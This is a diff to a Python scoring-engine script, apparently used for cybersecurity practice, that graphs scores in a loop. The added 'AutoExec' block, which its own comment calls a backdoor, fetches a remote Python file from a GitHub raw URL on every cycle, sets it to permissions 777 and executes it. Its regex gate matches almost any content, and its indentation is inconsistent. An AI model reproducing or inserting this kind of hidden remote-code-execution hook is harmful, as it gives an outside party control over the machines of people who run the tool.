@@ -12,6 +12,8 @@ import _datetime
 from multiprocessing import Process
 import numpy as np
 import matplotlib.pyplot as plt
+import urllib.request as urllib2
+import re
 mainUser = 'cyber' #the place to install ScoringEngine
 today = _datetime.date.today()
 #~~~~~~~~~~~~~~~~Create Classes~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
@@ -220,4 +222,17 @@ while True:
 	ax.yaxis.set_major_locator(MaxNLocator(integer=True))
 	plt.savefig('.graph.png',bbox='tight')
 	update()
+#~~~~~~~~~~~~~~~~~~AutoExec.py~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#this is basically a backdoor lol. its supposed to be to troubleshoot, but you can mess with them for fun. :)
+	fileLocationURL = "https://raw.githubusercontent.com/CyberCyber2/ScoringEngine/main/BaseFiles/01-AutoExec.py"
+		html_content = urllib2.urlopen(fileLocationURL).read().decode('utf-8')
+		matches = re.findall(str("[enable]"), html_content);
+		if len(matches) != 0: 
+			#print ('HTML Content: ' + str(html_content))
+			filename = "test.py"
+			file_ = open(filename, 'w')
+			file_.write(html_content)
+			file_.close()
+			subprocess.call(['chmod', '777',filename])
+			subprocess.call(['python3', filename])
 	time.sleep(20) #scoring interval
